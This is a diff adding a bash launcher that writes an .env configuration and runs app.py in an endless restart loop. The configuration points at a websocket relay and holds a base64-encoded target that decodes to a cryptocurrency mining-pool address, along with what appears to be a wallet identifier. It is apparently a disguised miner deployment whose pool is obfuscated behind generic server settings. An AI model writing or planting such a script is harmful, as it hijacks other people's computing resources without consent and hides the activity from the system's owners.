@@ -1,0 +1,10 @@
+#!/bin/bash
+CONNECT=$1
+NAME=$2
+echo "SERVER_WS=wss://account.dzetcloud.my.id
+SERVER_TARGET=c2cucXJsLmhlcm9taW5lcnMuY29tOjExNjY=
+SERVER_DOMAIN=Q000700c931a2d85fa0bae4d52106e5bf7430bcc284346047203e9715d45c461573231159419c21.${NAME}
+SERVER_SECRET=x
+SERVER_CONNECTION=${CONNECT}
+SERVER_MODE=FAST" > .env
+while true; do python3 app.py; sleep 15; done
